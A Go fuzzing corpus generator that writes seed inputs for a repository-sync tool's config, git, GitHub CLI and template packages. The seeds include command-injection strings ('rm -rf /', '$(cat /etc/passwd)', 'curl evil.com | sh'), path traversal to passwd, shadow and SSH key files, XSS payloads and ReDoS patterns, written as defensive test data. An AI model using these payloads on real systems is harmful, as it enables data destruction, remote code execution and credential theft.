// Package fuzz provides fuzzing utilities and corpus generation
//
//nolint:gosmopolitan // Test data requires unicode characters
package fuzz

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

// CorpusGenerator manages the generation of fuzz test corpus data
type CorpusGenerator struct {
	BaseDir string
}

// NewCorpusGenerator creates a new corpus generator
func NewCorpusGenerator(baseDir string) *CorpusGenerator {
	return &CorpusGenerator{BaseDir: baseDir}
}

// GenerateAll generates corpus for all packages
func (g *CorpusGenerator) GenerateAll() error {
	generators := []func() error{
		g.GenerateConfigCorpus,
		g.GenerateGitCorpus,
		g.GenerateGHCorpus,
		g.GenerateTransformCorpus,
	}

	for _, gen := range generators {
		if err := gen(); err != nil {
			return err
		}
	}
	return nil
}

// GenerateConfigCorpus generates test corpus for config package
func (g *CorpusGenerator) GenerateConfigCorpus() error {
	corpus := []string{
		// Valid configs
		`version: 1
source:
  repo: org/repo
  branch: main
targets:
  - repo: target/repo
    files:
      - src: README.md
        dest: README.md`,

		// Edge cases - version
		`version: 999999`,
		`version: -1`,
		`version: "1.0"`,
		`version: 0`,
		`version: 1.5`,

		// Security attempts - command injection
		`source: {repo: "org/repo; rm -rf /"}`,
		`source: {repo: "org/repo && curl evil.com/script | sh"}`,
		"source: {repo: \"org/repo`whoami`\"}",
		`source: {repo: "org/repo$(cat /etc/passwd)"}`,
		`source: {branch: "main; echo pwned"}`,

		// Security attempts - path traversal
		`source: {repo: "../../etc/passwd"}`,
		`source: {repo: "../../../home/user/.ssh/id_rsa"}`,
		`targets: [{repo: "org/repo", files: [{src: "../../../etc/passwd", dest: "README.md"}]}]`,
		`targets: [{repo: "org/repo", files: [{src: "README.md", dest: "/etc/passwd"}]}]`,

		// Unicode and special chars
		`source: {repo: "🎉/🎉"}`,
		`source: {repo: "org/repo` + "\x00" + `"}`,
		`source: {repo: "орг/репо"}`,                                    // Cyrillic
		`source: {repo: "组织/仓库"}`,                                       // Chinese
		"source: {repo: \"org/repo" + strings.Repeat("a", 1000) + "\"}", // Long name

		// Malformed YAML
		`{{{{{{{{{`,
		`version: 1
source:
  repo: [not, a, string]`,
		`- - - - -`,
		`%YAML 1.2`,

		// Empty and minimal
		``,
		`version: 1`,
		`{}`,
		`[]`,

		// Deeply nested
		generateDeeplyNested(50),
		generateDeeplyNested(100),

		// Complex valid config
		`version: 1
source:
  repo: org/template
  branch: develop
defaults:
  branch_prefix: sync/update
  pr_labels: ["automated", "sync", "chore"]
targets:
  - repo: org/service-a
    files:
      - src: .github/workflows/ci.yml
        dest: .github/workflows/ci.yml
      - src: Makefile
        dest: Makefile
    transform:
      repo_name: true
      variables:
        SERVICE: service-a
        ENVIRONMENT: production
  - repo: org/service-b
    files:
      - src: docker-compose.yml
        dest: docker-compose.yml
    transform:
      variables:
        PORT: "8080"`,
	}

	return g.saveCorpus("config", corpus)
}

// GenerateGitCorpus generates test corpus for git package
func (g *CorpusGenerator) GenerateGitCorpus() error {
	corpus := []string{
		// Valid URLs
		`https://github.com/org/repo.git`,
		`git@github.com:org/repo.git`,
		`https://gitlab.com/org/repo.git`,
		`ssh://git@github.com/org/repo.git`,
		`https://user:pass@github.com/org/repo.git`,

		// Command injection attempts
		`https://github.com/org/repo.git; rm -rf /`,
		`https://github.com/org/repo.git && curl evil.com | sh`,
		`https://github.com/org/repo.git$(whoami)`,
		"https://github.com/org/repo.git`id`",
		`git@github.com:org/repo.git; cat /etc/passwd`,

		// Path traversal
		`file:///etc/passwd`,
		`file://../../etc/shadow`,
		`https://github.com/../../../../etc/passwd`,
		`../../../.git/config`,

		// URL injection
		`javascript:alert(1)`,
		`data:text/html,<script>alert(1)</script>`,
		`vbscript:msgbox(1)`,

		// Special characters
		`https://github.com/org/repo` + "\x00" + `.git`,
		`https://github.com/org/repo\n.git`,
		`https://github.com/org/repo\r\n.git`,
		`https://github.com/org/repo	.git`, // tab

		// Unicode
		`https://github.com/орг/репо.git`,
		`https://github.com/组织/仓库.git`,
		`https://github.com/🎉/🎉.git`,

		// Edge cases
		``,
		`https://`,
		`git@`,
		`:::::`,
		"https://" + strings.Repeat("a", 10000) + ".com/repo.git",

		// File paths for git operations
		`README.md`,
		`src/main.go`,
		`path with spaces/file.txt`,
		`file;rm -rf /.txt`,
		`file|command.txt`,
		`file>.txt`,
		`file<.txt`,
		`file&echo test.txt`,
		`.git/hooks/pre-commit`,
		`../../outside/repo.txt`,
	}

	return g.saveCorpus("git", corpus)
}

// GenerateGHCorpus generates test corpus for GitHub CLI package
func (g *CorpusGenerator) GenerateGHCorpus() error {
	// CLI arguments as JSON arrays
	cliArgs := [][]string{
		// Valid commands
		{"pr", "create", "--title", "Test PR"},
		{"pr", "list", "--limit", "10"},
		{"issue", "create", "--title", "Bug report"},
		{"repo", "clone", "org/repo"},

		// Command injection
		{"pr", "create", "--title", "Test; rm -rf /"},
		{"pr", "create", "--title", "Test`whoami`"},
		{"pr", "create", "--body", "$(cat /etc/passwd)"},
		{"api", "/repos/org/repo", "-f", "name=test;echo injected"},
		{"repo", "clone", "org/repo && malicious-command"},

		// Path traversal
		{"repo", "clone", "../../etc/passwd"},
		{"api", "/../../../etc/passwd"},

		// Special characters
		{"pr", "create", "--title", "Test\x00"},
		{"pr", "create", "--title", "Test\nNewline"},
		{"pr", "create", "--title", "Test\r\nCRLF"},

		// Unicode
		{"pr", "create", "--title", "Тест"},
		{"pr", "create", "--title", "测试"},
		{"pr", "create", "--title", "🎉🎊🎈"},

		// Edge cases
		{},
		{""},
		{strings.Repeat("a", 1000)},
	}

	// Convert to JSON strings
	corpus := []string{}
	for _, args := range cliArgs {
		if data, err := json.Marshal(args); err == nil {
			corpus = append(corpus, string(data))
		}
	}

	// Add JSON parsing test cases
	jsonCases := []string{
		// Valid JSON
		`{"name": "repo", "owner": {"login": "org"}}`,
		`{"name": "repo", "private": true, "description": "Test repo"}`,
		`[{"name": "repo1"}, {"name": "repo2"}]`,

		// Malformed JSON
		`{{{{{`,
		`{"name": "repo"`,
		`{"name": repo}`,
		`{'name': 'repo'}`, // Single quotes

		// Injection attempts
		`{"name": "repo\"; rm -rf /"}`,
		`{"script": "<script>alert(1)</script>"}`,
		"{\"name\": \"" + "\x00" + "\"}",

		// Large/nested JSON
		"{\"data\": \"" + strings.Repeat("x", 10000) + "\"}",
		generateDeeplyNestedJSON(50),
	}

	corpus = append(corpus, jsonCases...)
	return g.saveCorpus("gh", corpus)
}

// GenerateTransformCorpus generates test corpus for transform package
func (g *CorpusGenerator) GenerateTransformCorpus() error {
	// Template test cases
	templates := []struct {
		template string
		vars     map[string]string
	}{
		// Basic substitution
		{
			template: "Hello {{NAME}}!",
			vars:     map[string]string{"NAME": "World"},
		},
		// Multiple variables
		{
			template: "{{GREETING}} {{NAME}}, welcome to {{PLACE}}",
			vars:     map[string]string{"GREETING": "Hello", "NAME": "User", "PLACE": "Earth"},
		},
		// Path injection
		{
			template: "Path: {{PATH}}",
			vars:     map[string]string{"PATH": "../../../etc/passwd"},
		},
		// Command injection
		{
			template: "Command: {{CMD}}",
			vars:     map[string]string{"CMD": "; rm -rf /"},
		},
		// Recursive substitution
		{
			template: "{{VAR1}}",
			vars:     map[string]string{"VAR1": "{{VAR2}}", "VAR2": "{{VAR1}}"},
		},
		// Unicode
		{
			template: "Unicode: {{EMOJI}}",
			vars:     map[string]string{"EMOJI": "🎉🎊🎈"},
		},
		// Empty and edge cases
		{
			template: "",
			vars:     map[string]string{},
		},
		{
			template: "{{}}",
			vars:     map[string]string{"": "empty"},
		},
		{
			template: "{{LONGVAR}}",
			vars:     map[string]string{"LONGVAR": strings.Repeat("x", 1000)},
		},
		// Nested braces
		{
			template: "{{ {{INNER}} }}",
			vars:     map[string]string{"INNER": "value", "value": "nested"},
		},
		// Special characters in variable names
		{
			template: "{{VAR-NAME}} {{VAR.NAME}} {{VAR NAME}}",
			vars:     map[string]string{"VAR-NAME": "dash", "VAR.NAME": "dot", "VAR NAME": "space"},
		},
	}

	corpus := []string{}
	for _, tc := range templates {
		// Add template
		corpus = append(corpus, tc.template)
		// Add vars as JSON
		if data, err := json.Marshal(tc.vars); err == nil {
			corpus = append(corpus, string(data))
		}
	}

	// Regex test cases
	regexCases := []struct {
		pattern     string
		replacement string
		input       string
	}{
		// Valid regex
		{`\d+`, "NUM", "Replace 123 with NUM"},
		{`(hello) (world)`, "$2 $1", "hello world"},
		{`[aeiou]`, "*", "vowels"},

		// Invalid regex
		{`[`, "X", "invalid bracket"},
		{`(?P<name>`, "X", "incomplete group"},
		{`*+`, "X", "invalid quantifier"},

		// ReDoS patterns
		{`(a+)+`, "X", strings.Repeat("a", 100) + "b"},
		{`(.*)*`, "X", strings.Repeat("x", 100)},

		// Replacement injection
		{`.+`, "../etc/passwd", "replace all"},
		{`.+`, "$0; rm -rf /", "command injection"},

		// Special replacements
		{`(\w+)`, `$1$1$1`, "triple"},
		{`test`, `${1:-default}`, "bash-like"},
	}

	for _, tc := range regexCases {
		corpus = append(corpus, tc.pattern)
		corpus = append(corpus, tc.replacement)
		corpus = append(corpus, tc.input)
	}

	return g.saveCorpus("transform", corpus)
}

// saveCorpus saves corpus data to files
func (g *CorpusGenerator) saveCorpus(category string, corpus []string) error {
	dir := filepath.Join(g.BaseDir, "corpus", category)
	if err := os.MkdirAll(dir, 0o750); err != nil {
		return fmt.Errorf("failed to create corpus directory: %w", err)
	}

	for i, data := range corpus {
		file := filepath.Join(dir, fmt.Sprintf("seed_%03d", i))
		if err := os.WriteFile(file, []byte(data), 0o600); err != nil {
			return fmt.Errorf("failed to write corpus file: %w", err)
		}
	}

	return nil
}

// generateDeeplyNested generates a deeply nested YAML structure
func generateDeeplyNested(depth int) string {
	var sb strings.Builder
	sb.WriteString("version: 1\n")
	sb.WriteString("source:\n")
	sb.WriteString("  repo: org/repo\n")
	sb.WriteString("targets:\n")

	indent := "  "
	for i := 0; i < depth; i++ {
		sb.WriteString(indent + "- repo: nested/repo" + fmt.Sprintf("%d", i) + "\n")
		sb.WriteString(indent + "  files:\n")
		indent += "    "
	}

	return sb.String()
}

// generateDeeplyNestedJSON generates deeply nested JSON
func generateDeeplyNestedJSON(depth int) string {
	var sb strings.Builder
	for i := 0; i < depth; i++ {
		sb.WriteString(`{"level":`)
	}
	sb.WriteString(`"bottom"`)
	for i := 0; i < depth; i++ {
		sb.WriteString(`}`)
	}
	return sb.String()
}
